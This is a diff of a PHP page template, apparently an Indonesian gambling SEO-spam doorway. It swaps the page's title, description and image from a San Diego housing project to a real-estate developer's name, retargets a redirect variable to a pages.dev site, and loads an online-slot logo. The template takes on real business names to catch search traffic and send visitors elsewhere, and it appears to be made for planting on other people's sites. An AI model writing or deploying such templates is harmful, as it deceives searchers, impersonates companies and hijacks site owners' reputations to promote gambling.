@@ -62,14 +62,14 @@
         $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
         // SEO DATA (AUTO GENERATE)
-        $title = "$BRAND : Hilltop Crossing San Diego Hunian Baru dan Lokasi Strategis";
+        $title = "$BRAND : Ito Girard & Associates Pengembang Properti San Diego";
 
-        $description = "$BRAND merupakan komunitas hunian yang berlokasi di kawasan Euclid dan Hilltop, San Diego, California. Proyek ini menghadirkan rumah baru dengan berbagai pilihan denah, garasi dua mobil, area luar ruangan, serta lokasi yang dekat dengan sekolah, taman, pusat perbelanjaan, dan akses jalan utama.";
+        $description = "$BRAND Ito Girard & Associates adalah pengembang real estat urban San Diego dengan pengalaman sejak 2004 dalam pengembangan hunian investasi dan properti komunitas.";
         
-        $artikel = "merupakan komunitas hunian yang berlokasi di kawasan Euclid dan Hilltop, San Diego, California. Proyek ini menghadirkan rumah baru dengan berbagai pilihan denah, garasi dua mobil, area luar ruangan, serta lokasi yang dekat dengan sekolah, taman, pusat perbelanjaan, dan akses jalan utama.";
+        $artikel = "Ito Girard & Associates adalah pengembang real estat urban San Diego dengan pengalaman sejak 2004 dalam pengembangan hunian investasi dan properti komunitas.";
 
         // Bisa diganti random image atau CDN sendiri
-        $image = "https://i.pinimg.com/1200x/2b/fe/31/2bfe311cb62c69ca747444b6f3edd087.jpg";  
+        $image = "https://i.pinimg.com/1200x/78/7d/f0/787df0cc9c08b0182874b2872dd14205.jpg";  
 
         // Canonical URL
         $canonical = $current_url;
@@ -79,7 +79,7 @@
     }
 
     // Redirect target
-    $ampmek = "https://hilltopcrossing.pages.dev/?id=$BRAND";
+    $ampmek = "https://itogirard.pages.dev/?id=$BRAND";
     $logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
     $favicon = "https://www.gstatic.com/search-console/scfe/favicon.png";
     ?>
